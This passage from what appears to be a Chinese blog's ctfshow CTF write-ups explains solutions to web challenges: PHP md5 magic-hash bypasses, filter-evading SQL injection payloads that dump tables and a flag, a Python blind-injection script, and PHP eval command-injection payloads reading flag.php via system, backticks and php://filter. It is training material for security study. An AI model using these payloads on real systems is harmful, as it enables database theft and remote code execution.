invoke__">ctype_alpha</span>(<span class="hljs-variable">$v1</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v1 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v2 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;where is flag?&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>考察md5绕过，要求v1为为字母，v2为数字，并且v1与v2的md5值相同。</p><p>md5漏洞介绍：<br>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0<br>所以只要v1与v2的md5值以0E开头即可。</p><p>0e开头的md5和原值：<br>QNKCDZO<br>0e830400451993494058024219903391<br>240610708<br>0e462097431906509019562988736854</p><p>输入到url中，成功获取flag</p><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>username尝试输入万能密码1’ or 1&#x3D;1#<br>密码随意<br>显示sql inject error，发现有字符被过滤。<br>逐个字符输入后发现过滤了空格，一般空格被过滤有如下替换方法</p><blockquote><p>&#x2F;**&#x2F;<br>()<br>回车(url编码中的%0a)<br>&#96;(tap键上面的按钮)<br>tap<br>两个空格</p></blockquote><p>这里选择&#x2F;**&#x2F;</p><p>接下来就到了广为人知的爆库，爆表，爆字段，爆字段值环节</p><p>爆库</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br><br>GAUSS<br></code></pre></td></tr></table></figure><p>爆表</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=database()),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br><br>CSHARP<br></code></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&#x27;flag&#x27;</span>),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br><br>CSHARP<br></code></pre></td></tr></table></figure><p>爆字段值</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>flag<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br><br>CSHARP<br></code></pre></td></tr></table></figure><p>得到flag</p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>又又又是sql注入漏洞题<br>一共有三个文章，通过点击切换不同的文章可以看出url地址的差别，页面同过文章的id值来查询文章内容，我们可以考虑sql注入漏洞<br>首先判断注入点，输入以下payload，使sql恒成立</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>and<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>页面正常显示</p><p>再输入以下payload，使sql恒不成立</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>and<span class="hljs-regexp">/**/</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>页面空显示</p><p>由此可以判断页面存在sql注入，注入点为<strong>数值型注入</strong>，页面中有显示位，可以尝试<strong>联合注入</strong>进行脱库<br>先来判断显示位，此处id传一个-1，由于id通常不为负数，后端根据id查询不到内容，就只能展示联合查询的结果，从而帮助我们判断字段显示的位置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>爆库</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span><br><br>AWK<br></code></pre></td></tr></table></figure><p>爆表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">tables</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span><br><br>PGSQL<br></code></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">column_name</span>)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">columns</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">table_name</span>=&quot;flag&quot;),<span class="hljs-number">3</span><br><br>PGSQL<br></code></pre></td></tr></table></figure><p>爆字段值</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-regexp">/**/</span>flag<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/</span>flag),<span class="hljs-number">3</span><br><br>AWK<br></code></pre></td></tr></table></figure><p>成功获取flag值</p><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>python脚本进行自动化脱库，注意payload中的字符串不换行，否则可能会出问题</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">import requests<br> <br>url = &#x27;http://9d1bf0f8-9f4f-4cd2-bd17-a1024a0d065c.challenge.ctf.show/index.php?id=-1<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>&#x27;<br>name = &#x27;&#x27;<br> <br># 循环45次( 循环次数按照返回的字符串长度自定义)<br>for i in range(1, 45):<br>    # 获取当前使用的数据库<br>    # payload = &#x27;ascii(substr(database()from<span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span>for<span class="hljs-comment">/**/</span>1))=%d&#x27;<br>    # 获取当前数据库的所有表<br>    # payload = &#x27;ascii(substr((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>())<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    # 获取flag表的字段</span><br><span class="hljs-string">    # payload = &#x27;</span>ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name=<span class="hljs-number">0x666C6167</span>)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    # 获取flag表的数据</span><br><span class="hljs-string">    payload = &#x27;</span>ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>flag<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>%d<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>))=%d<span class="hljs-string">&#x27;</span><br><span class="hljs-string">    count = 0</span><br><span class="hljs-string">    print(&#x27;</span>正在获取第 %d 个字符<span class="hljs-string">&#x27; % i)</span><br><span class="hljs-string">    # 截取SQL查询结果的每个字符, 并判断字符内容</span><br><span class="hljs-string">    for j in range(31, 128):</span><br><span class="hljs-string">        result = requests.get(url + payload % (i, j))</span><br><span class="hljs-string"> </span><br><span class="hljs-string">        if &#x27;</span><span class="hljs-keyword">If</span><span class="hljs-string">&#x27; in result.text:</span><br><span class="hljs-string">            name += chr(j)</span><br><span class="hljs-string">            print(&#x27;</span>数据库名/表名/字段名/数据: %s<span class="hljs-string">&#x27; % name)</span><br><span class="hljs-string">            break</span><br><span class="hljs-string"> </span><br><span class="hljs-string">        # 如果某个字符不存在,则停止程序</span><br><span class="hljs-string">        count += 1</span><br><span class="hljs-string">        if count &gt;= (128 - 31):</span><br><span class="hljs-string">            exit()</span><br></code></pre></td></tr></table></figure><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>扫描发现网站目录中存在robots.txt<br>打开robots.txt提示打开index.phps<br>访问&#x2F;index.phps得到源码</p><p>代码口令部分使用了MD5加密，也就是说我们输入的字符进密码框的时候会被转义成MD5，所以现在有一种方法就是把万能口令转换成MD5值到代码中执行并且绕过登陆拿到flag</p><p>万能密码<br><strong>ffifdyop</strong><br>转换为MD5就是：276f722736c95d99e921722cf9ed621c<br>转换为字符串为：’or’6xxx</p><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>打开页面点击取消按钮，出现源码。<br><code>$regex = &quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;;</code><br>从源码中可以得知几乎把注入用到的关键词过滤的差不多了。</p><p><code>if(strlen($username)!=strlen(replaceSpecialChar($username)))&#123;             die(&quot;sql inject error&quot;);         &#125;</code></p><p>无法双写绕过</p><p>mysql语句<br>①group by（将结果集中的数据行根据选择列的值进行逻辑分组）<br>在使用group by以后会按照password中的值进行排列：</p><p>②with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计）<br>结果中将会多出一行，其中password列为null，count（*）为统计和。</p><p>payload:<code>username=admin&#39;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</code><br>因为加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL&#x3D;&#x3D;NULL）即可满足$password&#x3D;&#x3D;$row[‘password’]的限制成功登陆。</p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>给出了源码， 过滤了这些字符：</p><p>$regex &#x3D; “&#x2F;(select|from|where|join|sleep|and|\s|union|,)&#x2F;i”;</p><p>满足这个条件时，输出 flag ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span>==<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;<br>            <span class="hljs-built_in">echo</span> <span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure><p>F12 在存储项把 PHPsession 的值给去掉，变为空。<br>不输入密码进行登录，达到密码的值和 session 的值相等，得到 flag 。</p>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow命令执行</title>
    <link href="/2023/04/26/%E5%88%B7%E9%A2%98/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2023/04/26/%E5%88%B7%E9%A2%98/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>  &#125;<br><br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  &#125;<br></code></pre></td></tr></table></figure><p>preg_match 函数用于执行一个正则表达式匹配。&#x2F;i意味着不分大小写。本句含义是不能用flag值且忽略了大小写。从这句可以看出过滤了flag</p><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p><strong>通用符</strong><br>想要执行 cat flag.php，但是flag被过滤了,这时候就可以使用通配符<br>cat f*表示打开当前目录下所有 f开头的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat f*&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-keyword">echo</span> ‘’<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(‘ls’);<br></code></pre></td></tr></table></figure><p>可以看到有 flag.php文件,之后采用include结合伪协议进行包含读取<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-keyword">echo</span> ‘’<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span><span class="hljs-string">&quot;<span class="hljs-subst">$_GET</span>[url]&quot;</span>;&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br><br></code></pre></td></tr></table></figure><h4 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h4><p>cp命令将flag.php保存到1.txt 再去访问1.txt</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cp fla?.php 1.txt&quot;</span>);<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">?c=<span class="hljs-keyword">system</span>(“cat *php &gt;&gt;<span class="hljs-number">2.</span>txt”);<br><span class="hljs-comment">*php是后缀为php，本句的意思是将后缀为php的写入2.txt中</span><br></code></pre></td></tr></table></figure><p>接着在url后输入&#x2F;1.txt就可以看到flag了</p><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>过滤了flag,system,php</p><h4 id="方法1-1"><a href="#方法1-1" class="headerlink" title="方法1"></a>方法1</h4><p>反引号执行系统命令<br>使用通配符或*绕过过滤flag和php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-keyword">echo</span> `cat f*`;<br></code></pre></td></tr></table></figure><h4 id="方法2-1"><a href="#方法2-1" class="headerlink" title="方法2"></a>方法2</h4><p>同29</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-string">&quot;$_GET[url]&quot;</span>?&gt;&amp;url=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><h4 id="方法3-1"><a href="#方法3-1" class="headerlink" title="方法3"></a>方法3</h4><p>用&#96;&#96;来代替system()，这里的是tab上面的反斜号</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">?c=`cp fla?.p?? <span class="hljs-number">1</span>.txt`;<br></code></pre></td></tr></table></figure><p>然后&#x2F;1.txt</p><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了flag,system,php,cat,sort,shell,空格，单引号，.</p><h4 id="方法1-2"><a href="#方法1-2" class="headerlink" title="方法1"></a>方法1</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>echo(`tac<span class="hljs-variable">%09</span>f*`)<span class="hljs-comment">;</span><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>echo(`<span class="hljs-keyword">tail</span><span class="hljs-variable">%09</span>f*`)<span class="hljs-comment">;</span><br>需要查看源码：<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>echo(`nl<span class="hljs-variable">%09</span>f*`)<span class="hljs-comment">;</span><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>echo(`less<span class="hljs-variable">%09</span>f*`)<span class="hljs-comment">;</span><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>echo(`more<span class="hljs-variable">%09</span>f*`)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h4 id="方法2-2"><a href="#方法2-2" class="headerlink" title="方法2"></a>方法2</h4><p>采用include结合<a href="https://blog.csdn.net/nzjdsds/article/details/82461043">伪协议</a>进行包含读取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-string">&quot;$_GET[url]&quot;</span>?&gt;&amp;url=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><h4 id="方法3-2"><a href="#方法3-2" class="headerlink" title="方法3"></a>方法3</h4><p>用eval( )来操作， 这个1已经不属于c的内容了，所以不受过滤管控了，</p><p>得到空白页面右击看源码才能得到flag</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br><br>MEL<br></code></pre></td></tr></table></figure><p>将cat 换成 tac 就可以直接看到flag,(tac 是 cat 的反向显示),cat也可以直接看到</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了flag,system,php,cat,sort,shell,echo,分号，空格，单引号，括号，空格，&#96;,.</p><h4 id="方法1-3"><a href="#方法1-3" class="headerlink" title="方法1"></a>方法1</h4><p>用c&#x3D;include”$_POST[x]”?&gt;或者c&#x3D;include”$_GET[x]”?&gt;然后用php伪协议将include包含的文件在页面上显示出来</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-string">&quot;$_GET[url]&quot;</span>?&gt;&amp;url=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br><br></code></pre></td></tr></table></figure><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><h4 id="方法1-4"><a href="#方法1-4" class="headerlink" title="方法1"></a>方法1</h4><p>多过滤了一个”<br>使用上一题的方法一样可以做出来</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span 